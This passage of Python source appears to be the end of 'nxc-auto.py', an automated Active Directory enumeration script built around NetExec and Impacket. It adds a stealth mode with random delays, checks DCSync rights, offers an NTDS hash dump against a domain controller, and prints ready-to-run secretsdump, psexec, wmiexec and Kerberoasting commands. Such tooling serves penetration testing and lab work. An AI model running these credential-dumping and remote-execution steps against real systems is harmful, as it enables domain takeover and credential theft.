async def enum_dacl():
    if not State.USER or not (State.PASS or State.HASH): return
    log_section("Advanced DACL Enumeration")
    base_cmd = ["nxc", "ldap", State.IP, "-u", State.USER]
    if State.PASS: base_cmd.extend(["-p", State.PASS])
    if State.HASH: base_cmd.extend(["-H", State.HASH])
    if State.DOMAIN: base_cmd.extend(["-d", State.DOMAIN])

    tasks = [
        async_run_cmd(base_cmd + ["-M", "daclread", "-o", "TARGET=Administrator", "ACTION=read"], outfile=f"{State.ENUM_DIR}/ldap/admin-ace.txt")
    ]
    
    if State.DOMAIN:
        domain_dn = f"DC={State.DOMAIN.replace('.', ',DC=')}"
        tasks.append(async_run_cmd(base_cmd + ["-M", "daclread", "-o", f"TARGET_DN={domain_dn}", "ACTION=read", "RIGHTS=DCSync"], outfile=f"{State.ENUM_DIR}/ldap/dcsync-rights.txt"))
    
    await asyncio.gather(*tasks)

async def enum_enum4linux_ng():
    if not os.path.exists("/usr/bin/enum4linux-ng"): return
    log_section("enum4linux-ng Enumeration")
    
    # Anonymous
    if not State.USER:
        await async_run_cmd(["enum4linux-ng", "-A", "-R", "-d", State.IP], outfile=f"{State.ENUM_DIR}/smb/enum4linux-ng-anonymous.txt", timeout=600)
    else:
        # Authenticated
        cmd = ["enum4linux-ng", "-u", State.USER, "-A", "-R", "-d", State.IP]
        if State.PASS: cmd.extend(["-p", State.PASS])
        if State.HASH: cmd.extend(["-H", State.HASH])
        await async_run_cmd(cmd, outfile=f"{State.ENUM_DIR}/smb/enum4linux-ng-auth.txt", timeout=600)

async def dump_ntds():
    if State.OS_TYPE != "windows" or not State.USER: return
    log_section("FINAL CHECK: NTDS Database Dump")
    log_warning("NTDS dump can crash DC on Windows Server 2019!")
    
    choice = input(f"{Colors.BYELLOW}❓ Do you want to attempt NTDS dump? [y/N]: {Colors.NC}")
    if choice.lower() == 'y':
        cmd = ["nxc", "smb", State.IP, "-u", State.USER]
        if State.PASS: cmd.extend(["-p", State.PASS])
        if State.HASH: cmd.extend(["-H", State.HASH])
        if State.DOMAIN: cmd.extend(["-d", State.DOMAIN])
        cmd.append("--ntds")
        await async_run_cmd(cmd, outfile=f"{State.ENUM_DIR}/smb/ntds-dump.txt", timeout=600)

async def async_run_cmd(cmd: List[str], timeout: int = 300, outfile: str = None) -> Tuple[int, str]:
    """Runs a shell command asynchronously and returns return code and output."""
    if State.STEALTH:
        # Pacing: delay before starting new task
        await asyncio.sleep(random.uniform(2, 5))
        
    async with State.SEMAPHORE:
        log_cmd(" ".join(cmd))
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )
            try:
                stdout, _ = await asyncio.wait_for(process.communicate(), timeout=timeout)
                out_str = stdout.decode('utf-8', errors='ignore')
                if outfile:
                    with open(outfile, "w") as f:
                        f.write(out_str)
                return process.returncode, out_str
            except asyncio.TimeoutError:
                process.kill()
                msg = "Command timed out"
                if outfile:
                    with open(outfile, "w") as f: f.write(msg)
                return -1, msg
        except Exception as e:
            msg = str(e)
            if outfile:
                with open(outfile, "w") as f: f.write(msg)
            return -2, msg

async def check_port(ip: str, port: int, service_name: str = "") -> bool:
    """Checks if a port is open."""
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=3)
        writer.close()
        await writer.wait_closed()
        return True
    except:
        if service_name:
            log_warning(f"Skipping {service_name} checks (Port {port} seems closed)")
        return False

async def check_target_alive(ip: str):
    """Checks if the target is alive via ping and common ports."""
    # Ping check
    ping_proc = await asyncio.create_subprocess_exec(
        "ping", "-c", "1", "-W", "1", ip,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL
    )
    await ping_proc.wait()
    if ping_proc.returncode == 0:
        return True

    # Fallback TCP check
    ports = [445, 3389, 22, 80, 443, 389, 139, 5985]
    checks = [check_port(ip, p) for p in ports]
    results = await asyncio.gather(*checks)
    if any(results):
        return True

    log_error(f"Target {ip} is no longer responding to ping or common TCP ports.")
    sys.exit(1)

def print_banner():
    banner = f"""{Colors.BCYAN}{Colors.BOLD}
  _  ___   _______        _         _   
 | \\| \\ \\ / / ____|      / \\  _   _|_|_ ___  
 |  ` |\\ V /| |         / _ \\| | | | __/ _ \\ 
 | |  |/   \\| |___     / ___ \\ |_| | || (_) |
 |_| _/_/ \\_\\_____|   /_/   \\_\\__,_|\\__\\___/ 
                                            
{Colors.BMAGENTA}       Automated Enumeration Script (Python Edition)
{Colors.BBLUE}       NetExec Power-Up | ADHD Friendly | Async Enabled{Colors.NC}\n"""
    print(banner)

def parse_args():
    parser = argparse.ArgumentParser(description="nxc-auto.py - Automated Enumeration Script")
    parser.add_argument("-i", "--ip", help="Target IP address", required=True)
    parser.add_argument("-u", "--user", help="Username", default="")
    parser.add_argument("-p", "--password", help="Password", default="")
    parser.add_argument("-d", "--domain", help="Domain", default="")
    parser.add_argument("-H", "--hash", help="NTLM Hash", default="")
    parser.add_argument("-o", "--os", choices=['w', 'windows', 'l', 'linux'], help="Target OS type")
    parser.add_argument("-n", "--check-alive", action="store_true", help="Check if target is alive before scanning")
    parser.add_argument("--stealth", action="store_true", help="Stealth mode: limit concurrency and add delays")
    
    args = parser.parse_args()
    State.IP = args.ip
    State.USER = args.user
    State.PASS = args.password
    State.DOMAIN = args.domain
    State.HASH = args.hash
    State.CHECK_ALIVE = args.check_alive
    State.STEALTH = args.stealth
    
    if args.os in ['w', 'windows']:
        State.OS_TYPE = "windows"
    elif args.os in ['l', 'linux']:
        State.OS_TYPE = "linux"
        
    return args

async def check_nxc_db():
    """Checks for nxc database schema issues and auto-fixes by removing old DBs."""
    try:
        rc, out = await async_run_cmd(["nxc", "smb", "127.0.0.1", "--timeout", "1"], timeout=5)
        if "Schema mismatch detected" in out:
            log_warning("NXC DB Schema mismatch detected. Auto-fixing...")
            db_paths = [
                os.path.expanduser("~/.nxc/workspaces/default/*.db"),
                "/root/.nxc/workspaces/default/*.db"
            ]
            for p in db_paths:
                subprocess.run(f"rm -f {p} 2>/dev/null", shell=True)
            log_success("Database files removed. NetExec will re-initialize them.")
    except:
        pass

def show_impacket_suggestions():
    if not State.USER or not (State.PASS or State.HASH): return
    
    log_section("Impacket Tools Quick Reference")
    target = f"{State.DOMAIN}/{State.USER}" if State.DOMAIN else State.USER
    if State.HASH:
        creds = f"-hashes :{State.HASH}"
    else:
        creds = f":'{State.PASS}'"
    
    print(f"  {Colors.BCYAN}# Credential Dumping:{Colors.NC}")
    print(f"  impacket-secretsdump {target}{creds}@{State.IP}")
    print(f"  {Colors.BCYAN}# Remote Command Execution:{Colors.NC}")
    print(f"  impacket-psexec {target}{creds}@{State.IP}")
    print(f"  impacket-wmiexec {target}{creds}@{State.IP}")
    print(f"  impacket-smbexec {target}{creds}@{State.IP}")
    print(f"  {Colors.BCYAN}# Kerberos Attacks:{Colors.NC}")
    if State.DOMAIN:
        print(f"  impacket-GetUserSPNs {target}{creds}@{State.IP} -dc-ip {State.IP} -request")
    print("")

async def main():
    print_banner()
    args = parse_args()
    
    # Initialize Semaphore for throttling
    if State.STEALTH:
        State.SEMAPHORE = asyncio.Semaphore(2)
        log_info("Stealth mode enabled: limiting concurrency to 2 and adding random delays.")
    else:
        State.SEMAPHORE = asyncio.Semaphore(100)
    
    # --- Fix PATH for Sudo/Pipx ---
    # Add common local bin paths to PATH
    paths_to_add = [
        os.path.expanduser("~/.local/bin"),
        "/usr/local/bin"
    ]
    
    # If run with sudo, also add the original user's local bin
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        try:
            import pwd
            user_home = pwd.getpwnam(sudo_user).pw_dir
            paths_to_add.append(os.path.join(user_home, ".local/bin"))
        except:
            pass
            
    current_path = os.environ.get("PATH", "")
    for p in paths_to_add:
        if os.path.isdir(p) and p not in current_path:
            current_path += os.pathsep + p
    os.environ["PATH"] = current_path
    # ----------------------------

    # Create enumeration directory
    os.makedirs(State.ENUM_DIR, exist_ok=True)
    for sub in ['smb', 'ldap', 'http']:
        os.makedirs(os.path.join(State.ENUM_DIR, sub), exist_ok=True)
        
    await check_dependencies()
    await check_nxc_db()
    
    log_section("Target Configuration")
    log_info(f"Target IP: {Colors.BWHITE}{State.IP}{Colors.NC}")
    
    if State.CHECK_ALIVE:
        await check_target_alive(State.IP)
    
    # Discovery
    if not State.OS_TYPE or not State.DOMAIN:
        await detect_target_info()
    
    log_info(f"Target OS Type: {Colors.BWHITE}{State.OS_TYPE}{Colors.NC}")
    if State.DOMAIN:
        log_info(f"Target Domain: {Colors.BWHITE}{State.DOMAIN}{Colors.NC}")

    show_impacket_suggestions()

    # Initialize files
    with open(State.VALID_CREDS_FILE, "w") as f: pass
    with open(State.POTENTIAL_CREDS_FILE, "w") as f: pass

    # Phase 1: Anonymous Enumeration
    # Always check anonymous access to discover misconfigurations, even if creds are provided
    await asyncio.gather(
        enum_smb(anonymous=True),
        enum_ldap(anonymous=True),
        enum_enum4linux_ng()
    )
    
    # Try to promote any found creds (only if the user didn't already provide creds)
    if not State.USER:
        if promote_verified_creds():
            log_success("Successfully promoted discovered credentials!")
            
    # Phase 2: Authenticated Enumeration (if we have creds)
    if State.USER:
        log_section("Authenticated Enumeration")
        # Run these in sequence or selective parallel
        if State.OS_TYPE == "windows":
            await asyncio.gather(
                enum_smb(anonymous=False),
                enum_ldap(anonymous=False),
                enum_rpc(),
                enum_rdp(),
                enum_mssql(),
                enum_wmi(),
                enum_vnc(),
                enum_dacl(),
                enum_enum4linux_ng(),
                enum_winrm_deep()
            )
        else:
            await enum_smb(anonymous=False) # Samba on Linux
            
    # Phase 3: Other Services (Parallel)
    log_section("Additional Service Checks")
    await asyncio.gather(
        enum_nfs(),
        enum_ftp(),
        enum_http(),
        enum_telnet(),
        enum_ssh()
    )
    
    # Phase 4: Final Checks
    if State.OS_TYPE == "windows" and State.USER:
        await dump_ntds()

    # Final prompt for anonymous mode if user was provided but we want to check null session anyway
    if args.user and not State.HAS_PROMOTED:
         choice = input(f"\n{Colors.BYELLOW}❓ Do you want to run anonymous/guest enumeration checks? [y/N]: {Colors.NC}")
         if choice.lower() == 'y':
             await asyncio.gather(
                 enum_smb(anonymous=True),
                 enum_ldap(anonymous=True)
             )

    log_section("Enumeration Complete")
    log_success(f"Results saved in: {Colors.BWHITE}{os.path.abspath(State.ENUM_DIR)}{Colors.NC}")
    if os.path.exists(State.VALID_CREDS_FILE) and os.path.getsize(State.VALID_CREDS_FILE) > 0:
        log_success(f"Valid credentials found! Check: {State.VALID_CREDS_FILE}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Colors.BRED}Exiting...{Colors.NC}")
        sys.exit(0)
